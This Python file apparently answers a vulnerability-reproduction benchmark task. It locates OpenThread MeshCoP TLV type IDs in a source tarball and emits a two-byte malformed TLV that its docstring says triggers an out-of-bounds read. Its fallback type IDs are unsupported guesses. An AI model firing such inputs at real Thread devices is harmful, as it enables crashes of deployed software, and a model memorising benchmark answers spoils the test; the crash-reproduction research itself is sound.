import tarfile
import re
from typing import Optional, Dict


def _strip_comments(text: str) -> str:
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
    text = re.sub(r'//.*', '', text)
    return text


def _parse_enum_blocks(text: str) -> Dict[str, int]:
    """
    Parse all enum blocks in given C/C++ text, returning a mapping from enumerator name to value.
    Only handles numeric literal assignments and auto-increment semantics.
    """
    mapping: Dict[str, int] = {}
    text_nc = _strip_comments(text)

    # Find enum ... { ... };
    for m in re.finditer(r'enum(?:\s+class)?\s+\w*\s*{([^}]*)}', text_nc, flags=re.S):
        content = m.group(1)
        # Split by commas at top level; simple split is fine for enum lists.
        parts = content.split(',')
        current_val: Optional[int] = None
        for part in parts:
            entry = part.strip()
            if not entry:
                continue
            # Remove potential trailing stuff after enumerator, like "= 1 /* comment */"
            # We already stripped comments; now handle assignments.
            if '=' in entry:
                name, rhs = entry.split('=', 1)
                name = name.strip()
                rhs = rhs.strip()
                # Extract first token in rhs which might be a number
                num_match = re.match(r'^(0x[0-9a-fA-F]+|\d+)', rhs)
                if not name:
                    continue
                if num_match:
                    try:
                        val = int(num_match.group(1), 0)
                    except ValueError:
                        continue
                    current_val = val
                    mapping[name] = current_val
                else:
                    # Unknown non-numeric assignment; cannot evaluate -> skip but keep name if needed
                    # For auto-increment after this, we can't infer value; reset to None
                    current_val = None
                    # Do not add mapping for non-numeric
            else:
                name = entry.strip()
                if not name:
                    continue
                if current_val is None:
                    current_val = 0
                else:
                    current_val += 1
                mapping[name] = current_val
    return mapping


def _find_tlv_type_ids_from_tar(src_path: str) -> Dict[str, int]:
    """
    Search the source tarball for TLV type numeric IDs for ActiveTimestamp, PendingTimestamp, DelayTimer.
    """
    keys = ['kActiveTimestamp', 'kPendingTimestamp', 'kDelayTimer',
            'ActiveTimestamp', 'PendingTimestamp', 'DelayTimer']
    found: Dict[str, int] = {}
    try:
        with tarfile.open(src_path, 'r:*') as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue
                name = member.name
                if not any(name.endswith(ext) for ext in ('.h', '.hh', '.hpp', '.c', '.cc', '.cpp', '.cxx')):
                    continue
                try:
                    data = tar.extractfile(member).read()
                except Exception:
                    continue
                try:
                    text = data.decode('utf-8', 'ignore')
                except Exception:
                    continue
                if not any(k in text for k in keys):
                    continue
                mapping = _parse_enum_blocks(text)
                # Try exact key names commonly used in OpenThread MeshCoP TLV types
                for k in ('kActiveTimestamp', 'ActiveTimestamp'):
                    if k in mapping and 'ActiveTimestamp' not in found:
                        found['ActiveTimestamp'] = mapping[k]
                for k in ('kPendingTimestamp', 'PendingTimestamp'):
                    if k in mapping and 'PendingTimestamp' not in found:
                        found['PendingTimestamp'] = mapping[k]
                for k in ('kDelayTimer', 'DelayTimer'):
                    if k in mapping and 'DelayTimer' not in found:
                        found['DelayTimer'] = mapping[k]
                # If we have all, stop early
                if all(k in found for k in ('ActiveTimestamp', 'PendingTimestamp', 'DelayTimer')):
                    break
    except Exception:
        pass
    return found


def _best_type_id(src_path: str) -> int:
    """
    Determine the most reliable TLV type id to trigger the bug, preferring ActiveTimestamp then PendingTimestamp, then DelayTimer.
    Fallback to common guesses if parsing fails.
    """
    found = _find_tlv_type_ids_from_tar(src_path)
    for key in ('ActiveTimestamp', 'PendingTimestamp', 'DelayTimer'):
        if key in found:
            return found[key]

    # Fallback guesses based on common MeshCoP TLV allocations in OpenThread.
    # These are heuristic; include several plausible values often used.
    # Prefer ActiveTimestamp-like guesses first.
    guessed_candidates = [
        14,  # often used
        24,  # plausible
        0x14,  # hex of 20
        0x16,  # 22
        0x17,  # 23
        0x1A,  # 26
        0x1B,  # 27
        0x09,  # 9
        0x0A,  # 10
    ]
    # Choose the first plausible
    return guessed_candidates[0]


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability by crafting a MeshCoP Dataset TLV
        with an Active/Pending Timestamp or Delay Timer TLV having an undersized length at end-of-input.
        """
        tlv_type = _best_type_id(src_path)
        # Construct TLV: [Type (1), Length (1), Value (len=0)] placed at end-of-input.
        # Minimal payload is sufficient to trigger the invalid read in vulnerable versions.
        poc = bytes([tlv_type & 0xFF, 0x00])
        return poc